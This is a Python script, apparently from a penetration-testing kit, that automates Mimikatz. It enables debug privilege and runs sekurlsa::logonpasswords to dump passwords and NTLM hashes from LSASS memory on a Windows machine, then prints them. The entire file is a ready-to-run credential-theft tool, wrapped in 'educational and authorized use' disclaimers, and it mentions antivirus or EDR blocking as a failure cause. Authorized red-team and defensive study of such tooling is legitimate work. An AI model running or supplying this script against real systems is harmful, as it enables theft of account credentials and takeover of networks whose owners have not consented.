#!/usr/bin/env python3
"""
mimikatz_automation.py
Active Directory Penetration Testing - Mimikatz Automation Script
For educational and authorized security testing only.

This script automates the execution of Mimikatz to dump credentials from memory
in a controlled test environment. It includes error handling, logging, and
security controls.

Author: Eugen (Captain X)
License: MIT
"""

import os
import subprocess
import sys
from datetime import datetime


# ============================================================================
# FUNCTION: check_mimikatz_path
# ============================================================================
# Purpose: Verify that the Mimikatz executable exists at the specified path
# Input: mimikatz_path - String containing the full path to mimikatz.exe
# Output: Boolean - True if file exists, False otherwise
# ============================================================================
def check_mimikatz_path(mimikatz_path):
    """
    Verify that Mimikatz exists at the specified path.
    
    This function checks if the Mimikatz executable file exists at the
    provided location. If the file is missing, it prints an error message
    and returns False to prevent the script from continuing.
    
    Args:
        mimikatz_path (str): Full path to mimikatz.exe
    
    Returns:
        bool: True if Mimikatz exists, False otherwise
    """
    # Use os.path.exists() to check if the file exists
    if not os.path.exists(mimikatz_path):
        # Print error message to inform the user
        print(f"[!] ERROR: Mimikatz not found at specified path: {mimikatz_path}")
        print("[!] Please update the mimikatz_path variable with the correct location.")
        return False
    
    # File exists, return True
    print(f"[+] Mimikatz found at: {mimikatz_path}")
    return True


# ============================================================================
# FUNCTION: run_mimikatz_command
# ============================================================================
# Purpose: Execute a Mimikatz command and capture the output
# Input: mimikatz_path - Path to mimikatz.exe
#        command - Mimikatz command string to execute
# Output: String containing command output, or None if error
# ============================================================================
def run_mimikatz_command(mimikatz_path, command):
    """
    Execute a Mimikatz command and return the output.
    
    This function uses Python's subprocess module to run Mimikatz with
    the specified command. It captures both stdout and stderr, and handles
    any exceptions that might occur during execution.
    
    Args:
        mimikatz_path (str): Full path to mimikatz.exe
        command (str): Mimikatz command to execute
    
    Returns:
        str: Command output if successful, None if error
    """
    try:
        # Use subprocess.run() to execute Mimikatz
        # - [mimikatz_path, command]: Command and arguments as list
        # - capture_output=True: Capture stdout and stderr
        # - text=True: Return output as string instead of bytes
        print(f"[*] Executing Mimikatz command...")
        process = subprocess.run(
            [mimikatz_path, command],
            capture_output=True,
            text=True,
            timeout=60  # Timeout after 60 seconds to prevent hanging
        )
        
        # Check if the command was successful
        if process.returncode != 0:
            print(f"[!] Mimikatz exited with error code: {process.returncode}")
            if process.stderr:
                print(f"[!] Error output: {process.stderr}")
            return process.stdout  # Still return stdout even if there was an error
        
        # Return the captured output
        return process.stdout
        
    except subprocess.TimeoutExpired:
        print("[!] ERROR: Mimikatz command timed out after 60 seconds.")
        return None
    except FileNotFoundError:
        print(f"[!] ERROR: Mimikatz executable not found at: {mimikatz_path}")
        return None
    except PermissionError:
        print("[!] ERROR: Permission denied. Please run this script with Administrator privileges.")
        print("[!] Mimikatz requires administrative privileges to access LSASS memory.")
        return None
    except Exception as e:
        print(f"[!] ERROR: Unexpected error running Mimikatz: {e}")
        return None


# ============================================================================
# FUNCTION: log_execution
# ============================================================================
# Purpose: Log script execution details for auditing and tracking
# Input: details - String containing log information
# Output: None (writes to mimikatz_log.txt)
# ============================================================================
def log_execution(details):
    """
    Log script execution for auditing purposes.
    
    This function writes execution details to a log file for later review.
    It includes timestamps to track when the script was run and what commands
    were executed. This is important for security auditing and incident
    response.
    
    Args:
        details (str): Information to log
    """
    try:
        # Generate a timestamp for the log entry
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Open the log file in append mode
        with open("mimikatz_log.txt", "a") as log_file:
            # Write timestamp and details to the log
            log_file.write(f"[{timestamp}] {details}\n")
        
        print("[+] Execution logged to mimikatz_log.txt")
        
    except Exception as e:
        print(f"[!] WARNING: Could not write to log file: {e}")


# ============================================================================
# FUNCTION: print_banner
# ============================================================================
# Purpose: Display a banner with tool information and warnings
# Input: None
# Output: Prints banner to console
# ============================================================================
def print_banner():
    """
    Print the tool banner with warnings and legal disclaimers.
    
    This function displays a banner when the script starts to clearly
    indicate the tool's purpose and remind the user about legal and
    ethical considerations.
    """
    banner = """
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                                                                           ║
    ║   MIMIKATZ AUTOMATION SCRIPT                                          ║
    ║   Active Directory Penetration Testing - Credential Dumping              ║
    ║                                                                           ║
    ║   WARNING: This script is for EDUCATIONAL and AUTHORIZED testing    ║
    ║   only. Unauthorized use is illegal and unethical.                      ║
    ║                                                                           ║
    ║   Requires:                                                           ║
    ║   - Administrative/SYSTEM privileges                                    ║
    ║   - Mimikatz executable available                                        ║
    ║   - Authorized testing environment                                       ║
    ║                                                                           ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)


# ============================================================================
# FUNCTION: main
# ============================================================================
# Purpose: Main execution function that orchestrates the script
# Input: None (uses configuration variables)
# Output: None (prints results and creates log files)
# ============================================================================
def main():
    """
    Main function to run the Mimikatz automation script.
    
    This function orchestrates the entire script execution:
    1. Prints the banner
    2. Checks if Mimikatz exists
    3. Executes the Mimikatz command
    4. Captures and displays the output
    5. Logs the execution for auditing
    
    The script uses a try-except block to handle keyboard interrupts
    (Ctrl+C) gracefully.
    """
    # ========================================================================
    # CONFIGURATION
    # ========================================================================
    # IMPORTANT: Update this path to the actual location of mimikatz.exe
    # on your machine. Example paths:
    #   Windows: "C:\\Tools\\Mimikatz\\mimikatz.exe"
    #   Kali: "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe"
    # ========================================================================
    mimikatz_path = "C:\\Tools\\Mimikatz\\mimikatz.exe"
    
    # The Mimikatz command to execute
    # This command does the following:
    #   privilege::debug    - Enable debug privileges (required for memory access)
    #   sekurlsa::logonpasswords - Dump credentials from LSASS memory
    #   exit                - Exit Mimikatz after execution
    mimikatz_command = "privilege::debug sekurlsa::logonpasswords exit"
    
    try:
        # Print the banner
        print_banner()
        
        print("[*] Starting Mimikatz Automation Script...")
        print("[*] For educational and authorized testing only.")
        print("[*] Press CTRL+C to stop at any time.\n")
        
        # ====================================================================
        # STEP 1: Check if Mimikatz exists
        # ====================================================================
        print("[*] Checking for Mimikatz executable...")
        if not check_mimikatz_path(mimikatz_path):
            # If Mimikatz doesn't exist, exit the script
            print("[!] Script terminated: Mimikatz not found.")
            sys.exit(1)
        
        print("")  # Empty line for readability
        
        # ====================================================================
        # STEP 2: Execute Mimikatz command
        # ====================================================================
        print(f"[*] Command to execute: {mimikatz_command}")
        print("[*] This may take a few moments...\n")
        
        # Run the Mimikatz command and capture output
        output = run_mimikatz_command(mimikatz_path, mimikatz_command)
        
        # ====================================================================
        # STEP 3: Process and display output
        # ====================================================================
        if output:
            # Log the execution for auditing
            log_execution(f"Executed command: {mimikatz_command}")
            log_execution(f"Mimikatz path: {mimikatz_path}")
            
            # Display the output
            print("\n" + "=" * 70)
            print("MIMIKATZ OUTPUT:")
            print("=" * 70)
            print(output)
            print("=" * 70)
            
            # Security warning about handling credentials
            print("\n  SECURITY NOTICE:")
            print("   The output above may contain sensitive credentials.")
            print("   - DO NOT share this output with unauthorized personnel.")
            print("   - DO NOT save credentials in plaintext.")
            print("   - Delete captured hashes after testing.")
            print("   - Use only in authorized testing environments.\n")
            
            # Check for common credential patterns in output
            if "NTLM" in output or "Password" in output or "Hash" in output:
                print("[!] WARNING: Credential data detected in output.")
                print("[!] Please handle the output securely.\n")
            
            print("[+] Script completed successfully.")
            
        else:
            # No output received
            print("[!] Failed to execute Mimikatz command.")
            print("[!] Possible issues:")
            print("    1. Mimikatz path is incorrect")
            print("    2. Insufficient privileges (need Administrator)")
            print("    3. Antivirus/EDR is blocking Mimikatz")
            print("    4. Mimikatz binary is corrupted\n")
            sys.exit(1)
            
    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        print("\n" + "=" * 50)
        print("[!] Script terminated by user.")
        print("[*] Use responsibly. Always test in authorized environments.")
        print("=" * 50)
        sys.exit(0)
        
    except Exception as e:
        # Handle any unexpected errors
        print(f"\n[!] An unexpected error occurred: {e}")
        print("[!] Please check your configuration and try again.")
        sys.exit(1)


# ============================================================================
# ENTRY POINT
# ============================================================================
# This ensures the script runs when executed directly, but can be imported
# as a module without running automatically.
# ============================================================================
if __name__ == "__main__":
    main()